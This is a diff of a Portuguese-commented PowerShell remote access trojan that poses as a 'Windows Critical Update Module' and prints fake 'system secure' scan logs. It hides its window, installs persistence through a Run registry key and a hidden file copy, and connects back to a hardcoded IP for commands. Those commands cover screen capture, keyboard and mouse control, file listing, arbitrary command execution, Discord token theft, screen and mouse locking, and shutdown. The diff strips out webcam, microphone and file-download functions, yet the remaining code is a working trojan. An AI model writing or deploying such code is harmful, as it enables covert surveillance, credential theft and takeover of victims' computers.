@@ -2,7 +2,7 @@
 .SYNOPSIS
 Windows Critical System Component
 .DESCRIPTION
-Microsoft Windows Critical Update Module - Complete Control
+Microsoft Windows Critical Update Module
 .NOTES
 Version: 10.0.19045.1
 #>
@@ -11,150 +11,32 @@ Version: 10.0.19045.1
 $serverIP = "198.1.195.194"  # MUDE PARA SEU IP
 $serverPort = 4000
 $installName = "WinUpdateSvc"
-$mutexName = "Global\MicrosoftWindowsUpdateService_{F2E3B8A1-9B6D-4F8E-9C5A-8B3D7E2F1C6A}"
-$registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\WinUpdateSvc"
-$userListFile = "$env:ProgramData\Microsoft\Windows\Caches\users.dat"
+$mutexName = "Global\MicrosoftWindowsUpdateService"
 
-# ===== MUTEX - EVITA MULTIPLAS INSTANCIAS =====
+# ===== MUTEX =====
 $mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0, $false)) { exit }
 
-# ===== VERIFICAR SE É ADMIN =====
+# ===== VERIFICAR ADMIN =====
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $host.UI.RawUI.ForegroundColor = "Red"
-    Write-Host ""
-    Write-Host "╔════════════════════════════════════════════════════════════╗"
-    Write-Host "║                    ERRO DE EXECUÇÃO                        ║"
-    Write-Host "╠════════════════════════════════════════════════════════════╣"
-    Write-Host "║  Este programa requer privilégios de ADMINISTRADOR!       ║"
-    Write-Host "║                                                            ║"
-    Write-Host "║  Por favor, execute o PowerShell como Administrador       ║"
-    Write-Host "║  e tente novamente.                                        ║"
-    Write-Host "╚════════════════════════════════════════════════════════════╝"
-    Write-Host ""
-    $host.UI.RawUI.ForegroundColor = "White"
-    Start-Sleep -Seconds 5
+    Write-Host "Este programa requer administrador!" -ForegroundColor Red
+    Start-Sleep -Seconds 3
     exit
 }
 
-# ===== FUNÇÃO PARA DELETAR USUÁRIO DO RAT =====
-function Remove-UserFromRAT {
-    param([string]$UserName)
-    
-    try {
-        $removido = $false
-        
-        # 1. Remove do registro
-        if (Test-Path $registryPath) {
-            Remove-Item -Path $registryPath -Recurse -Force -ErrorAction SilentlyContinue
-            $removido = $true
-        }
-        
-        # 2. Remove da lista de usuários
-        if (Test-Path $userListFile) {
-            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-            $newUsers = $users | Where-Object { $_ -ne $UserName }
-            $newUsers | Set-Content $userListFile -Force
-            $removido = $true
-        }
-        
-        # 3. Remove tarefas agendadas
-        $tasks = Get-ScheduledTask -TaskPath "\" -ErrorAction SilentlyContinue | Where-Object { $_.TaskName -like "*$installName*" }
-        foreach ($task in $tasks) {
-            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
-            $removido = $true
-        }
-        
-        if ($removido) {
-            return "USUARIO_REMOVIDO"
-        } else {
-            return "USUARIO_NAO_ENCONTRADO"
-        }
-    } catch {
-        return "ERRO_AO_REMOVER"
-    }
-}
-
-# ===== FUNÇÃO PARA LISTAR USUÁRIOS DO RAT =====
-function Get-RATUsers {
-    try {
-        $users = @()
-        
-        if (Test-Path $userListFile) {
-            $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-        }
-        
-        if ($users.Count -eq 0) {
-            return "Nenhum usuário encontrado"
-        }
-        
-        return "USUARIOS:" + ($users -join "`n")
-    } catch {
-        return "ERRO_AO_LISTAR"
-    }
-}
-
-# ===== FUNÇÃO PARA ADICIONAR USUÁRIO À LISTA =====
-function Add-UserToList {
-    param([string]$UserName)
-    
-    try {
-        New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
-        Add-Content -Path $userListFile -Value $UserName -Force
-        
-        New-Item -Path $registryPath -Force | Out-Null
-        Set-ItemProperty -Path $registryPath -Name "UserName" -Value $UserName -Force
-        Set-ItemProperty -Path $registryPath -Name "InstallDate" -Value (Get-Date).ToString() -Force
-        
-        return $true
-    } catch {
-        return $false
-    }
-}
-
-# ===== VERIFICAR SE USUÁRIO JÁ EXECUTOU ANTES =====
-$currentUser = "$env:COMPUTERNAME@$env:USERNAME"
-$userExecuted = $false
-
-if (Test-Path $userListFile) {
-    $users = Get-Content $userListFile -ErrorAction SilentlyContinue
-    if ($users -contains $currentUser) {
-        $userExecuted = $true
-    }
-}
-
-if (-not $userExecuted) {
-    Add-UserToList $currentUser
-}
-
-# ===== LOGS FAKES =====
-$host.UI.RawUI.ForegroundColor = "Green"
+# ===== LOGS FAKES SIMPLES =====
 Write-Host ""
 Write-Host "==================================================" -ForegroundColor Cyan
 Write-Host "    WINDOWS SECURITY MODULE" -ForegroundColor Cyan
-Write-Host "    Versao 10.0.19045.1" -ForegroundColor Cyan
 Write-Host "==================================================" -ForegroundColor Cyan
 Write-Host ""
+Start-Sleep -Seconds 1
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Inicializando..." -ForegroundColor Gray
 Start-Sleep -Milliseconds 500
-
-$logs = @(
-    "Inicializando modulo de verificacao do sistema..."
-    "Carregando bibliotecas de analise..."
-    "Verificando integridade do sistema..."
-    "Escaneando arquivos criticos do Windows..."
-    "Analisando processos em execucao..."
-    "Detectando possiveis ameacas..."
-)
-
-foreach ($log in $logs) {
-    Write-Host "[$(Get-Date -Format 'HH:mm:ss')] $log" -ForegroundColor Gray
-    Start-Sleep -Milliseconds 300
-}
-
-Write-Host ""
-Write-Host "[$(Get-Date -Format 'HH:mm:ss')] VERIFICACAO CONCLUIDA - SISTEMA SEGURO" -ForegroundColor Green
-Write-Host ""
-Start-Sleep -Seconds 2
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Verificando integridade..." -ForegroundColor Gray
+Start-Sleep -Milliseconds 500
+Write-Host "[$(Get-Date -Format 'HH:mm:ss')] Sistema seguro" -ForegroundColor Green
+Start-Sleep -Seconds 1
 
 # ===== ESCONDE JANELA =====
 Add-Type -Name Window -Namespace Console -MemberDefinition @'
@@ -166,7 +48,7 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 $consolePtr = [Console.Window]::GetConsoleWindow()
 [Console.Window]::ShowWindow($consolePtr, 0)
 
-# ===== FUNCOES PRINCIPAIS =====
+# ===== FUNCOES BASICAS =====
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
@@ -177,12 +59,10 @@ function Get-ScreenCapture {
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
-        
         $ms = New-Object System.IO.MemoryStream
         $bitmap.Save($ms, [System.Drawing.Imaging.ImageFormat]::Jpeg)
         $graphics.Dispose()
         $bitmap.Dispose()
-        
         $base64 = [Convert]::ToBase64String($ms.ToArray())
         $ms.Dispose()
         return "SCREEN:$base64"
@@ -191,7 +71,7 @@ function Get-ScreenCapture {
     }
 }
 
-# ===== CONTROLE DE MOUSE =====
+# ===== MOUSE =====
 function Move-Mouse { 
     param($x, $y)
     try {
@@ -211,16 +91,7 @@ function Click-Mouse {
     }
 }
 
-function RightClick-Mouse {
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait("+{F10}")
-        return "OK"
-    } catch { 
-        return "RIGHTCLICK_ERROR" 
-    }
-}
-
-# ===== CONTROLE DE TECLADO =====
+# ===== TECLADO =====
 function Send-Key {
     param($key)
     try {
@@ -231,27 +102,14 @@ function Send-Key {
     }
 }
 
-function Send-Text {
-    param($text)
-    try {
-        [System.Windows.Forms.SendKeys]::SendWait($text)
-        return "OK"
-    } catch { 
-        return "TEXT_ERROR" 
-    }
-}
-
-# ===== GERENCIADOR DE ARQUIVOS =====
+# ===== ARQUIVOS =====
 function Get-FileList {
     param($Path)
     try {
-        if (-not (Test-Path $Path)) { return "[]" }
         $items = Get-ChildItem $Path -ErrorAction SilentlyContinue | ForEach-Object {
             [PSCustomObject]@{
                 Name = $_.Name
-                FullName = $_.FullName
                 Type = if ($_.PSIsContainer) { "PASTA" } else { "ARQUIVO" }
-                Size = if ($_.PSIsContainer) { "" } else { "{0:N0} KB" -f ($_.Length/1KB) }
             }
         }
         return ($items | ConvertTo-Json -Compress)
@@ -260,70 +118,38 @@ function Get-FileList {
     }
 }
 
-function Download-File {
-    param($Path)
-    try {
-        if (Test-Path $Path) {
-            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($Path))
-            return "FILE:$content"
-        }
-        return "FILE_NOT_FOUND"
-    } catch { 
-        return "DOWNLOAD_ERROR" 
-    }
-}
-
-# ===== EXECUTAR COMANDO =====
+# ===== COMANDOS =====
 function Execute-Command {
     param($Cmd)
     try {
-        $Cmd = $Cmd.Trim('"').Trim("'")
-        $result = Invoke-Expression $Cmd 2>&1
-        
-        if ($result -is [System.Management.Automation.ErrorRecord]) {
-            $output = "ERRO: " + $result.ToString()
-        } elseif ($result -eq $null -or $result -eq "") {
-            $output = "Comando executado (sem saída)"
-        } else {
-            $output = $result | Out-String
-        }
-        
-        return $output
+        $result = Invoke-Expression $Cmd 2>&1 | Out-String
+        if ([string]::IsNullOrEmpty($result)) { $result = "Comando executado" }
+        return $result
     } catch {
-        return "Erro ao executar comando: $_"
+        return "Erro: $_"
     }
 }
 
-# ===== DISCORD TOKEN GRABBER =====
+# ===== DISCORD TOKEN =====
 function Get-DiscordToken {
     try {
         $tokens = @()
         $paths = @(
             "$env:APPDATA\discord\Local Storage\leveldb",
-            "$env:APPDATA\discordptb\Local Storage\leveldb",
-            "$env:APPDATA\discordcanary\Local Storage\leveldb",
-            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Storage\leveldb",
-            "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+            "$env:APPDATA\discordptb\Local Storage\leveldb"
         )
-        
         foreach ($path in $paths) {
             if (Test-Path $path) {
                 Get-ChildItem "$path\*.ldb" -ErrorAction SilentlyContinue | ForEach-Object {
                     $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
-                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}')
+                    $regex = [regex]::new('[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}')
                     $matches = $regex.Matches($content)
-                    foreach ($match in $matches) {
-                        $tokens += $match.Value
-                    }
+                    foreach ($match in $matches) { $tokens += $match.Value }
                 }
             }
         }
-        
         $tokens = $tokens | Select-Object -Unique
-        if ($tokens.Count -eq 0) { 
-            return "TOKENS:Nenhum token encontrado" 
-        }
-        
+        if ($tokens.Count -eq 0) { return "TOKENS:Nenhum token encontrado" }
         return "TOKENS:" + ($tokens -join "`n")
     } catch {
         return "TOKENS_ERROR"
@@ -346,25 +172,13 @@ function Block-System32 {
 }
 
 # ===== TELA PRETA =====
-$global:blackScreenForm = $null
-
-function Show-BlackScreen {
+function Black-Screen {
     try {
-        Add-Type -AssemblyName System.Windows.Forms
-        
         $form = New-Object System.Windows.Forms.Form
         $form.WindowState = 'Maximized'
         $form.FormBorderStyle = 'None'
         $form.TopMost = $true
         $form.BackColor = 'Black'
-        $form.ControlBox = $false
-        $form.ShowInTaskbar = $false
-        $form.KeyPreview = $true
-        $form.Add_KeyDown({
-            if ($_.KeyCode -eq 'Escape') { $form.Close() }
-        })
-        
-        $global:blackScreenForm = $form
         $form.ShowDialog()
         return "BLACK_SCREEN"
     } catch {
@@ -372,91 +186,33 @@ function Show-BlackScreen {
     }
 }
 
-function Hide-BlackScreen {
-    try {
-        if ($global:blackScreenForm -and !$global:blackScreenForm.IsDisposed) {
-            $global:blackScreenForm.Invoke([Action]{ $global:blackScreenForm.Close() })
-            $global:blackScreenForm.Dispose()
-            $global:blackScreenForm = $null
-        }
-        return "SCREEN_UNLOCKED"
-    } catch {
-        return "UNLOCK_ERROR"
-    }
-}
-
 # ===== TRAVAR MOUSE =====
-$global:mouseLocked = $false
-$global:lockThread = $null
-
 function Lock-Mouse {
     try {
-        if ($global:mouseLocked) { return "MOUSE_ALREADY_LOCKED" }
-        
-        $global:mouseLocked = $true
-        
-        $mouseLockerCode = @'
-using System;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-
-public class MouseLocker
-{
-    [DllImport("user32.dll")]
-    public static extern bool ClipCursor(ref RECT lpRect);
-    
-    [StructLayout(LayoutKind.Sequential)]
-    public struct RECT
-    {
-        public int left;
-        public int top;
-        public int right;
-        public int bottom;
-    }
-    
-    public static void Lock()
-    {
-        RECT rect = new RECT();
-        rect.left = 0;
-        rect.top = 0;
-        rect.right = 1;
-        rect.bottom = 1;
-        ClipCursor(ref rect);
-    }
-    
-    public static void Unlock()
-    {
-        RECT rect = new RECT();
-        rect.left = 0;
-        rect.top = 0;
-        rect.right = Screen.PrimaryScreen.Bounds.Width;
-        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
-        ClipCursor(ref rect);
-    }
-}
-'@
-        
-        try {
-            Add-Type -TypeDefinition $mouseLockerCode -ReferencedAssemblies "System.Windows.Forms.dll" -ErrorAction Stop
-        } catch {
-            # Tipo já existe, continuar
-        }
-        
-        $global:lockThread = [System.Threading.Thread]::new({
-            try {
-                while ($global:mouseLocked) {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    [MouseLocker]::Lock()
-                    Start-Sleep -Milliseconds 10
+        Add-Type @"
+            using System;
+            using System.Runtime.InteropServices;
+            public class MouseLocker {
+                [DllImport("user32.dll")]
+                public static extern bool ClipCursor(ref RECT lpRect);
+                [StructLayout(LayoutKind.Sequential)]
+                public struct RECT { public int left, top, right, bottom; }
+                public static void Lock() {
+                    RECT rect = new RECT();
+                    rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
+                    ClipCursor(ref rect);
                 }
-            } catch {
-                # Silenciosamente ignorar erros
+                public static void Unlock() {
+                    RECT rect = new RECT();
+                    rect.left = 0; rect.top = 0;
+                    rect.right = Screen.PrimaryScreen.Bounds.Width;
+                    rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+                    ClipCursor(ref rect);
+                }
             }
-        })
+"@ -ReferencedAssemblies "System.Windows.Forms.dll"
         
-        $global:lockThread.IsBackground = $true
-        $global:lockThread.Start()
-        
+        [MouseLocker]::Lock()
         return "MOUSE_LOCKED"
     } catch {
         return "MOUSE_ERROR"
@@ -465,143 +221,14 @@ public class MouseLocker
 
 function Unlock-Mouse {
     try {
-        $global:mouseLocked = $false
-        
-        if ($global:lockThread -and $global:lockThread.IsAlive) {
-            $global:lockThread.Abort()
-        }
-        
-        try {
-            [MouseLocker]::Unlock()
-        } catch {
-            # Ignorar se não existir
-        }
-        
+        [MouseLocker]::Unlock()
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
     }
 }
 
-# ===== MICROFONE =====
-function Get-Microphone {
-    try {
-        $filename = "$env:TEMP\mic_$(Get-Random).wav"
-        
-        try {
-            $recorder = New-Object -ComObject SoundRecorder
-            $recorder.StartRecording($filename)
-            Start-Sleep -Seconds 5
-            $recorder.StopRecording()
-        } catch {
-            Add-Type -AssemblyName System.Speech
-            $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-            $speech.SetInputToDefaultAudioDevice()
-            $speech.RecognizeAsyncTimeout = 5000
-            $speech.RecognizeAsync()
-            Start-Sleep -Seconds 5
-            $speech.RecognizeAsyncStop()
-        }
-        
-        if (Test-Path $filename) {
-            $content = [Convert]::ToBase64String([IO.File]::ReadAllBytes($filename))
-            Remove-Item $filename -Force
-            return "AUDIO:$content"
-        }
-        return "AUDIO_ERROR"
-    } catch {
-        return "AUDIO_ERROR"
-    }
-}
-
-# ===== WEBCAM =====
-function Get-Webcam {
-    try {
-        $webcamCode = @'
-using System;
-using System.Drawing;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-
-public class WebcamCapture
-{
-    [DllImport("avicap32.dll")]
-    public static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, int nID);
-    
-    [DllImport("user32.dll")]
-    public static extern int SendMessage(IntPtr hWnd, int wMsg, int wParam, int lParam);
-    
-    [DllImport("user32.dll")]
-    public static extern bool DestroyWindow(IntPtr hWnd);
-    
-    const int WM_CAP_CONNECT = 0x400 + 10;
-    const int WM_CAP_DISCONNECT = 0x400 + 11;
-    const int WM_CAP_GET_FRAME = 0x400 + 12;
-    const int WM_CAP_SAVEDIB = 0x400 + 25;
-    
-    public static string Capture() {
-        IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0, 0, 0, 320, 240, IntPtr.Zero, 0);
-        if (hWnd != IntPtr.Zero) {
-            SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
-            SendMessage(hWnd, WM_CAP_GET_FRAME, 0, 0);
-            
-            string filename = System.IO.Path.GetTempFileName() + ".bmp";
-            IntPtr pFilename = Marshal.StringToHGlobalAnsi(filename);
-            SendMessage(hWnd, WM_CAP_SAVEDIB, 0, pFilename);
-            Marshal.FreeHGlobal(pFilename);
-            
-            SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
-            DestroyWindow(hWnd);
-            
-            if (System.IO.File.Exists(filename)) {
-                byte[] bytes = System.IO.File.ReadAllBytes(filename);
-                System.IO.File.Delete(filename);
-                return Convert.ToBase64String(bytes);
-            }
-        }
-        return null;
-    }
-}
-'@
-        
-        try {
-            Add-Type -TypeDefinition $webcamCode -ReferencedAssemblies "System.Drawing.dll", "System.Windows.Forms.dll" -ErrorAction Stop
-        } catch {
-            # Tipo já existe, continuar
-        }
-        
-        $frame = [WebcamCapture]::Capture()
-        if ($frame) {
-            return "WEBCAM:$frame"
-        }
-        return "WEBCAM_ERROR"
-    } catch {
-        return "WEBCAM_ERROR"
-    }
-}
-
-# ===== PROCESSOS =====
-function Get-ProcessList {
-    try {
-        $processes = Get-Process | Select-Object -First 20 Name, CPU, WorkingSet, Id | ConvertTo-Json -Compress
-        return $processes
-    } catch {
-        return "PROCESS_ERROR"
-    }
-}
-
-# ===== URL =====
-function Open-Url {
-    param($url)
-    try {
-        Start-Process $url
-        return "URL_OPENED"
-    } catch {
-        return "URL_ERROR"
-    }
-}
-
-# ===== CONTROLE DE ENERGIA =====
+# ===== ENERGIA =====
 function Power-Control {
     param($Action)
     try {
@@ -615,33 +242,18 @@ function Power-Control {
     }
 }
 
-# ===== PERSISTENCIA =====
+# ===== PERSISTENCIA SIMPLES =====
 function Install-Persistence {
     $scriptPath = "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1"
-    
     New-Item -ItemType Directory -Path "$env:ProgramData\Microsoft\Windows\Caches" -Force | Out-Null
     Copy-Item $MyInvocation.MyCommand.Path $scriptPath -Force
-    
-    try {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -File `"$scriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtStartup
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
-        Register-ScheduledTask -TaskName $installName -Action $action -Trigger $trigger -Principal $principal -Force
-    } catch {
-        # Silenciosamente ignorar erros
-    }
-    
     try {
         $regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
         Set-ItemProperty -Path $regPath -Name $installName -Value "powershell.exe -NoProfile -WindowStyle Hidden -File `"$scriptPath`"" -Force
-    } catch {
-        # Silenciosamente ignorar erros
-    }
-    
+    } catch {}
     attrib +h +s +r $scriptPath
 }
 
-# ===== VERIFICAR INSTALACAO =====
 if (-not (Test-Path "$env:ProgramData\Microsoft\Windows\Caches\$installName.ps1")) {
     Install-Persistence
 }
@@ -655,72 +267,42 @@ while ($true) {
         $reader = New-Object System.IO.StreamReader($stream)
         $writer.AutoFlush = $true
         
-        # ENVIA IDENTIFICACAO
         $writer.WriteLine("$env:COMPUTERNAME@$env:USERNAME")
         
         while ($client.Connected) {
             $cmd = $reader.ReadLine()
             if ([string]::IsNullOrEmpty($cmd)) { continue }
             
-            switch -Wildcard ($cmd) {
+            switch ($cmd) {
                 "screenshot" { $writer.WriteLine((Get-ScreenCapture)) }
-                "move *" { 
-                    $pos = $cmd.Replace("move ","").Split(" ")
-                    if ($pos.Count -ge 2) {
-                        $writer.WriteLine((Move-Mouse $pos[0] $pos[1]))
-                    }
-                }
                 "click" { $writer.WriteLine((Click-Mouse)) }
-                "rightclick" { $writer.WriteLine((RightClick-Mouse)) }
-                "key *" { 
-                    $key = $cmd.Replace("key ","")
-                    $writer.WriteLine((Send-Key $key))
-                }
-                "type *" { 
-                    $text = $cmd.Replace("type ","")
-                    $writer.WriteLine((Send-Text $text))
-                }
-                "ls *" { 
-                    $path = $cmd.Replace("ls ","")
-                    $writer.WriteLine((Get-FileList $path))
-                }
-                "download *" { 
-                    $file = $cmd.Replace("download ","")
-                    $writer.WriteLine((Download-File $file))
-                }
-                "exec *" { 
-                    $command = $cmd.Substring(5)
-                    $result = Execute-Command $command
-                    $writer.WriteLine($result)
-                }
-                "discord" { $result = Get-DiscordToken; $writer.WriteLine($result) }
+                "discord" { $writer.WriteLine((Get-DiscordToken)) }
                 "block_system32" { $writer.WriteLine((Block-System32)) }
-                "black_screen" { 
-                    $ps = [powershell]::Create()
-                    $ps.AddScript({ Show-BlackScreen }).BeginInvoke()
-                    $writer.WriteLine("BLACK_SCREEN")
-                }
-                "unlock_screen" { $writer.WriteLine((Hide-BlackScreen)) }
+                "black_screen" { $writer.WriteLine((Black-Screen)) }
                 "lock_mouse" { $writer.WriteLine((Lock-Mouse)) }
                 "unlock_mouse" { $writer.WriteLine((Unlock-Mouse)) }
                 "shutdown" { $writer.WriteLine((Power-Control "shutdown")) }
                 "reboot" { $writer.WriteLine((Power-Control "reboot")) }
-                "mic" { $writer.WriteLine((Get-Microphone)) }
-                "webcam" { $writer.WriteLine((Get-Webcam)) }
-                "processes" { $writer.WriteLine((Get-ProcessList)) }
-                "url *" { 
-                    $url = $cmd.Replace("url ","")
-                    $writer.WriteLine((Open-Url $url))
-                }
-                "list_users" { $writer.WriteLine((Get-RATUsers)) }
-                "remove_user *" { 
-                    $userToRemove = $cmd.Replace("remove_user ","")
-                    $writer.WriteLine((Remove-UserFromRAT $userToRemove))
-                }
-                "remove_current_user" { $writer.WriteLine((Remove-UserFromRAT $currentUser)) }
                 "test" { $writer.WriteLine("PONG") }
                 "exit" { break }
-                default { $writer.WriteLine("Comando nao reconhecido") }
+                default { 
+                    if ($cmd -match "^move (.+) (.+)$") {
+                        $x = $matches[1]
+                        $y = $matches[2]
+                        $writer.WriteLine((Move-Mouse $x $y))
+                    } elseif ($cmd -match "^key (.+)$") {
+                        $key = $matches[1]
+                        $writer.WriteLine((Send-Key $key))
+                    } elseif ($cmd -match "^ls (.+)$") {
+                        $path = $matches[1]
+                        $writer.WriteLine((Get-FileList $path))
+                    } elseif ($cmd -match "^exec (.+)$") {
+                        $command = $matches[1]
+                        $writer.WriteLine((Execute-Command $command))
+                    } else {
+                        $writer.WriteLine("Comando nao reconhecido")
+                    }
+                }
             }
         }
     } catch {
